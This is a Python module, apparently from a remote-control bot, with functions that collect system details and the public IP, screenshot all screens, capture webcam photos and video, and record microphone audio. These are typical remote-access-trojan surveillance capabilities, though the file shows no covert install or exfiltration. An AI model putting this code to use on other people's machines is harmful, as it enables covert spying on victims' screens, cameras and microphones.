from __future__ import annotations

import platform
import socket
import time
import threading
import urllib.request
from dataclasses import dataclass
from datetime import datetime
from io import BytesIO
from pathlib import Path

import psutil
from PIL import ImageGrab

# Блокировка для камеры и микрофона, чтобы не было конфликтов при повторных запросах
media_lock = threading.Lock()


@dataclass(slots=True)
class RuntimeSnapshot:
    hostname: str
    os_name: str
    os_release: str
    python_version: str
    ip_address: str
    cpu_percent: float
    memory_percent: float
    disk_percent: float
    uptime_seconds: int
    admin_count: int
    autostart_enabled: bool
    bot_running: bool


def collect_snapshot(admin_count: int, autostart_enabled: bool, bot_running: bool) -> RuntimeSnapshot:
    boot_time = psutil.boot_time()
    uptime_seconds = max(0, int(time.time() - boot_time))
    disk_root = _disk_root()

    return RuntimeSnapshot(
        hostname=socket.gethostname(),
        os_name=platform.system(),
        os_release=platform.release(),
        python_version=platform.python_version(),
        ip_address=_public_ip(),
        cpu_percent=psutil.cpu_percent(interval=0.2),
        memory_percent=psutil.virtual_memory().percent,
        disk_percent=psutil.disk_usage(str(disk_root)).percent,
        uptime_seconds=uptime_seconds,
        admin_count=admin_count,
        autostart_enabled=autostart_enabled,
        bot_running=bot_running,
    )


def format_uptime(total_seconds: int) -> str:
    days, rem = divmod(max(total_seconds, 0), 86_400)
    hours, rem = divmod(rem, 3_600)
    minutes, seconds = divmod(rem, 60)
    if days:
        return f'{days}d {hours:02d}:{minutes:02d}:{seconds:02d}'
    return f'{hours:02d}:{minutes:02d}:{seconds:02d}'


def capture_screenshot_bytes() -> tuple[bytes, str]:
    image = ImageGrab.grab(all_screens=True)
    now = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_name = f'screenshot_{now}.jpg'
    output = BytesIO()
    image.convert('RGB').save(output, format='JPEG', quality=75, optimize=True)
    return output.getvalue(), file_name


def capture_webcam_photo() -> tuple[bytes, str]:
    with media_lock:
        import cv2
        # CAP_DSHOW часто решает проблемы с зависанием камер на Windows
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                raise RuntimeError('Камера не найдена или недоступна.')
        try:
            # Пропускаем несколько кадров для автонастройки экспозиции
            for _ in range(10):
                cap.read()
            ret, frame = cap.read()
            if not ret:
                raise RuntimeError('Не удалось получить кадр с камеры.')

            success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
            if not success:
                raise RuntimeError('Ошибка кодирования изображения.')

            now = datetime.now().strftime('%Y%m%d_%H%M%S')
            return buffer.tobytes(), f'webcam_{now}.jpg'
        finally:
            cap.release()


def capture_webcam_video(duration_seconds: int) -> tuple[bytes, str]:
    with media_lock:
        import cv2
        import tempfile
        import os

        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                raise RuntimeError('Камера не найдена или недоступна.')
        try:
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            fd, path = tempfile.mkstemp(suffix='.mp4')
            os.close(fd)

            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = 20.0

            out = cv2.VideoWriter(path, fourcc, fps, (width, height))

            start_time = time.time()
            while time.time() - start_time < duration_seconds:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
            out.release()

            with open(path, 'rb') as f:
                data = f.read()
            os.remove(path)

            now = datetime.now().strftime('%Y%m%d_%H%M%S')
            return data, f'webcamvid_{now}.mp4'
        finally:
            cap.release()


def record_audio(duration_seconds: int) -> tuple[bytes, str]:
    with media_lock:
        import pyaudio
        import wave
        from io import BytesIO

        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100

        p = pyaudio.PyAudio()
        try:
            stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = []
            for _ in range(0, int(RATE / CHUNK * duration_seconds)):
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
        finally:
            p.terminate()

        output = BytesIO()
        wf = wave.open(output, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        now = datetime.now().strftime('%Y%m%d_%H%M%S')
        return output.getvalue(), f'audio_{now}.wav'


def _disk_root() -> Path:
    home = Path.home()
    drive = home.drive
    if drive:
        return Path(f'{drive}\\')
    return Path('/')


def _public_ip() -> str:
    try:
        req = urllib.request.Request('https://api.ipify.org', headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            return response.read().decode('utf8').strip()
    except Exception:
        pass

    # Если публичный не получился, отдаем локальный
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect(('8.8.8.8', 80))
            return str(sock.getsockname()[0])
    except OSError:
        return 'unknown'